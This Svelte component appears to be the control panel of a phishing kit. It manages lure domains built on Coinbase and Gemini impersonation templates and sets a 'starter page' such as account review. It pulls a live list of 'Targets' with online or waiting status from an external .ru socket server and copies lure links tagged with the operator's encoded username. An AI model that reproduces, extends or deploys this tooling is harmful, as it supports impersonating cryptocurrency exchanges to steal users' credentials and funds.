<script lang="ts">
	import { onMount } from 'svelte';
	import { fade, slide } from 'svelte/transition';
	import pageConfigurations from '$lib/data/pageConfigurations.json';

	interface PageConfig {
		icon: string;
		description: string;
		dataCollected: string;
		imagePath: string;
	}

	interface GroupConfig {
		icon: string;
		pages: { [key: string]: PageConfig };
	}

	interface PageConfigurations {
		groups: { [key: string]: GroupConfig };
	}

	const typedPageConfigurations = pageConfigurations as PageConfigurations;

	export let username: string;
	export let guild: string;
	import Coinbase from '$lib/images/coinbase-v2.svg';
	import Gemini from '$lib/images/gemini-dollar-gusd-logo.svg';

	import greenDot from '$lib/images/Green_dot.svg';
	import redDot from '$lib/images/Red_dot.svg';

	let Targets: Array<any> = [];
	let activePages: Array<any> = [];
	let showModal = false;
	let modalMessage = '';
	let modalSuccess = false;

	$: filteredTargets = Targets.filter(
		(target) => target.status === 'Online' || target.status === 'Waiting'
	);

	async function getStarterPage() {
		try {
			const response = await fetch('/api/startingPage/get', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({ username })
			});
			const data = await response.json();
			if (data.success) {
				return data.starting_page;
			}
			return 'account_review';
		} catch (err) {
			console.error('Error getting starter page:', err);
			return 'account_review';
		}
	}

	async function setStarterPage(page: string) {
		try {
			const response = await fetch('/api/startingPage/set', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					username,
					starting_page: page
				})
			});
			const data = await response.json();

			showModal = true;
			if (data.success) {
				modalSuccess = true;
				modalMessage = 'Successfully updated starter page!';
			} else {
				modalSuccess = false;
				modalMessage = 'Failed to update starter page: ' + data.error;
			}

			setTimeout(() => {
				showModal = false;
			}, 3000);
		} catch (err) {
			console.error('Error setting starter page:', err);
			showModal = true;
			modalSuccess = false;
			modalMessage = 'Failed to update starter page';

			setTimeout(() => {
				showModal = false;
			}, 3000);
		}
	}

	async function checkDomainStatus(domain: string): Promise<boolean> {
		console.log(`Checking status for domain: ${domain}`);
		try {
			const controller = new AbortController();
			const timeoutId = setTimeout(() => controller.abort(), 5000);

			const response = await fetch(`https://${domain}`, {
				signal: controller.signal
			});

			clearTimeout(timeoutId);

			console.log(`Domain ${domain} response:`, {
				type: response.type,
				status: response.status,
				statusText: response.statusText,
				ok: response.ok
			});

			return response.status === 200;
		} catch (error) {
			console.error(`Domain ${domain} is unreachable:`, error);
			return false;
		}
	}

	async function fetchDomains() {
		console.log('Fetching domains...');
		try {
			const response = await fetch(`/api/guild/getDomains?guild=${guild}`);
			const domains = await response.json();
			console.log('Received domains:', domains);

			const starterPage = await getStarterPage();

			activePages = await Promise.all(
				domains.map(async (domain: any, index: number) => {
					console.log(`Processing domain ${index + 1}:`, domain);
					const isOnline = await checkDomainStatus(domain.url);
					return {
						ID: index + 1,
						URL: domain.url,
						Template: domain.template || 'Coinbase',
						starterPage: starterPage,
						Status: isOnline ? 'Operational' : 'Offline'
					};
				})
			);
			console.log('Updated activePages:', activePages);
		} catch (error) {
			console.error('Error fetching domains:', error);
		}
	}

	function copyURL(URL: string) {
		let copyText = 'https://www.' + URL + '/?id=' + btoa(username);
		navigator.clipboard.writeText(copyText);
		alert('Copied the URL: ' + copyText);
	}

	let statusCheckInterval: NodeJS.Timeout | undefined;

	onMount(() => {
		const initialize = async () => {
			console.log('Component mounted, initializing...');
			await fetchDomains();
			const res = await fetch(`https://artofjotlery.ru/socketServer/api/targets/${username}`);
			Targets = await res.json();
			console.log('Targets loaded:', Targets);

			statusCheckInterval = setInterval(async () => {
				console.log('Running status check interval...');
				activePages = await Promise.all(
					activePages.map(async (page) => {
						const isOnline = await checkDomainStatus(page.URL);
						return { ...page, Status: isOnline ? 'Operational' : 'Offline' };
					})
				);
				activePages = [...activePages];
				console.log('Status check complete, updated pages:', activePages);
			}, 3000);
		};

		initialize();

		return () => {
			console.log('Component cleanup, clearing interval');
			if (statusCheckInterval) clearInterval(statusCheckInterval);
		};
	});

	function formatPageName(name: string): string {
		return name
			.split('_')
			.map((word) => word.charAt(0).toUpperCase() + word.slice(1))
			.join(' ');
	}
</script>

{#if showModal}
	<div class="notification-container" transition:slide={{ duration: 300 }}>
		<div
			class="notification"
			class:success={modalSuccess}
			class:error={!modalSuccess}
			transition:fade
		>
			<div class="notification-content">
				<span class="material-icons">{modalSuccess ? 'check_circle' : 'error'}</span>
				<span class="message">{modalMessage}</span>
			</div>
			<div class="progress-bar" />
		</div>
	</div>
{/if}

<div class="overview">
	<div class="intro">
		<p>An overview of your domains.</p>
		<h1 class="white">Domains</h1>
	</div>
	<div class="performance">
		<div class="earnings">
			<div class="box">
				<p><span class="material-icons">domain</span> Domains Connected</p>
				<h1 class="white">{activePages.length}</h1>
			</div>
			<div class="box">
				<p><span class="material-icons">check_circle</span> Domains Active</p>
				<h1 class="white">{activePages.filter((page) => page.Status === 'Operational').length}</h1>
			</div>
			<div class="box">
				<p><span class="material-icons">sync_alt</span> Connects</p>
				<h1 class="white">{Targets.length}</h1>
			</div>
		</div>
		<table>
			<thead>
				<tr>
					<th>ID</th>
					<th>URL</th>
					<th>Template</th>
					<th>Starter Page</th>
					<th>Status</th>
					<th>Actions</th>
				</tr>
			</thead>
			<tbody>
				{#each activePages as page}
					<tr>
						<td>{page.ID}</td>
						<td>{page.URL}</td>
						{#if page.Template == 'Coinbase'}
							<td>
								<div class="logoHolder">
									<img src={Coinbase} height="15em" width="15em" />
									{page.Template}
								</div>
							</td>
						{:else if page.Template == 'Gemini'}
							<td>
								<div class="logoHolder">
									<img src={Gemini} height="15em" width="15em" />
									{page.Template}
								</div>
							</td>
						{/if}
						<td>
							<select
								class="styledDropdown"
								bind:value={page.starterPage}
								on:change={() => setStarterPage(page.starterPage)}
							>
								{#each Object.entries(typedPageConfigurations.groups) as [groupName, group]}
									<optgroup label={groupName}>
										{#each Object.entries(group.pages) as [pageId, pageConfig]}
											<option value={pageId}>
												{formatPageName(pageId)}
											</option>
										{/each}
									</optgroup>
								{/each}
							</select>
						</td>
						{#if page.Status == 'Operational'}
							<td>
								<div class="logoHolder">
									<span class="status-dot online"></span>
									{page.Status}
								</div>
							</td>
						{:else}
							<td>
								<div class="logoHolder">
									<span class="status-dot offline"></span>
									{page.Status}
								</div>
							</td>
						{/if}
						<td>
							<div class="action-buttons">
								<button class="action-btn copy" on:click={() => copyURL(page.URL)}>
									<span class="material-icons">content_copy</span>
								</button>
								<button class="action-btn delete" on:click={() => copyURL(page.URL)}>
									<span class="material-icons">link_off</span>
								</button>
							</div>
						</td>
					</tr>
				{/each}
			</tbody>
		</table>
	</div>
</div>

<style>
	.modal {
		position: fixed;
		top: 20px;
		right: 20px;
		padding: 1em 2em;
		border-radius: 8px;
		color: white;
		font-weight: bold;
		animation: slideIn 0.3s ease-out;
		z-index: 1000;
	}

	@keyframes slideIn {
		from {
			transform: translateX(100%);
			opacity: 0;
		}
		to {
			transform: translateX(0);
			opacity: 1;
		}
	}

	.success {
		background-color: rgba(40, 167, 69, 0.9);
		border: 1px solid #28a745;
	}

	.error {
		background-color: rgba(220, 53, 69, 0.9);
		border: 1px solid #dc3545;
	}

	.box p {
		display: flex;
		align-items: center;
		gap: 0.3em;
	}

	.logoHolder {
		display: flex;
		align-items: center;
		gap: 0.5em;
	}

	table {
		width: 100%;
		text-align: left;
		padding: 1.5em;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 60%);
		border-radius: 1em;
		border-collapse: separate;
		border-spacing: 0;
		box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
		overflow: hidden;
	}

	th {
		font-weight: 500;
		color: rgba(255, 255, 255, 0.7);
		text-transform: uppercase;
		font-size: 0.85em;
		letter-spacing: 0.05em;
		padding: 1.2em 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	td {
		padding: 1.2em 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.1);
		transition: all 0.2s ease;
	}

	tr:last-child td {
		border-bottom: none;
	}

	tr:hover td {
		background: rgba(98, 71, 218, 0.05);
	}

	.status-dot {
		width: 8px;
		height: 8px;
		border-radius: 50%;
		margin-right: 8px;
		transition: all 0.3s ease;
	}

	.status-dot.online {
		background: #00ff9d;
		box-shadow: 0 0 12px rgba(0, 255, 157, 0.4);
	}

	.status-dot.offline {
		background: #ff4444;
		box-shadow: 0 0 12px rgba(255, 68, 68, 0.4);
	}

	.performance {
		display: flex;
		flex-direction: column;
		gap: 1em;
	}

	.earnings {
		display: flex;
		gap: 1em;
	}

	.box {
		padding: 1.5em;
		border: 1px solid #0f131d;
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border-radius: 1em;
	}

	.earnings .box {
		width: 20em;
	}

	.intro {
		padding-bottom: 1em;
		border-bottom: 1px solid #0f131d;
		margin-bottom: 2em;
	}

	.styledDropdown {
		font-family: 'DM Sans', sans-serif;
		padding: 0.8em 1em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		color: white;
		cursor: pointer;
		transition: all 0.3s ease;
		min-width: 200px;
	}

	.styledDropdown:hover {
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.styledDropdown optgroup {
		background: #0e0d15;
		color: #8b8b8b;
		font-weight: 500;
		padding: 0.5em;
	}

	.styledDropdown option {
		background: #16171a;
		color: white;
		padding: 0.8em;
	}

	.notification-container {
		position: fixed;
		top: 20px;
		right: 20px;
		z-index: 1000;
		padding: 1em;
	}

	.notification {
		min-width: 300px;
		padding: 1em 1.5em;
		border-radius: 12px;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(10px);
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		position: relative;
		overflow: hidden;
		border: 1px solid rgba(98, 71, 218, 0.3);
	}

	.notification.success {
		background: linear-gradient(45deg, rgba(40, 167, 69, 0.95) 0%, rgba(14, 13, 21, 0.98) 100%);
	}

	.notification.error {
		background: linear-gradient(45deg, rgba(220, 53, 69, 0.95) 0%, rgba(14, 13, 21, 0.98) 100%);
	}

	.notification-content {
		display: flex;
		align-items: center;
		gap: 0.8em;
		color: white;
	}

	.notification .material-icons {
		font-size: 1.4em;
	}

	.notification .message {
		font-weight: 500;
	}

	.progress-bar {
		position: absolute;
		bottom: 0;
		left: 0;
		height: 3px;
		background: rgba(255, 255, 255, 0.3);
		animation: progress 3s linear forwards;
	}

	@keyframes progress {
		from {
			width: 100%;
		}
		to {
			width: 0%;
		}
	}

	.action-buttons {
		display: flex;
		gap: 0.5em;
		justify-content: flex-start;
		align-items: center;
	}

	.action-btn {
		display: flex;
		align-items: center;
		justify-content: center;
		width: 32px;
		height: 32px;
		border-radius: 8px;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: rgba(56, 35, 155, 0.1);
		color: white;
		cursor: pointer;
		transition: all 0.2s ease;
		padding: 0;
	}

	.action-btn:hover {
		transform: translateY(-2px);
	}

	.action-btn .material-icons {
		font-size: 1.2em;
	}

	.action-btn.copy {
		color: #00c8ff;
	}

	.action-btn.copy:hover {
		background: rgba(0, 200, 255, 0.1);
		border-color: rgba(0, 200, 255, 0.4);
		box-shadow: 0 4px 12px rgba(0, 200, 255, 0.2);
	}

	.action-btn.delete {
		color: #ff3b30;
	}

	.action-btn.delete:hover {
		background: rgba(255, 59, 48, 0.1);
		border-color: rgba(255, 59, 48, 0.4);
		box-shadow: 0 4px 12px rgba(255, 59, 48, 0.2);
	}

	tbody tr {
		animation: fadeIn 0.3s ease forwards;
	}

	@keyframes fadeIn {
		from {
			opacity: 0;
			transform: translateY(10px);
		}
		to {
			opacity: 1;
			transform: translateY(0);
		}
	}
</style>
